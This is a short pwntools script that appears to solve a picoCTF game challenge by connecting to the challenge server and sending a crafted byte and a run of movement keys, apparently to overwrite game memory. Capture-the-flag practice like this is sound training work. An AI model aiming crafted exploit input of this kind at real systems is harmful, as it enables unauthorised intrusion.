#!/usr/bin/env python
from pwn import *
context.log_level = "debug"
#r = process("./game") # 0, 51
r = remote("saturn.picoctf.net", 53195)
r.sendline(b"l\x79")
#pause()
r.sendline(b"a"*43 + b"w"*5 + b"s")

print(r.recvall())
#r.interactive()
r.close()
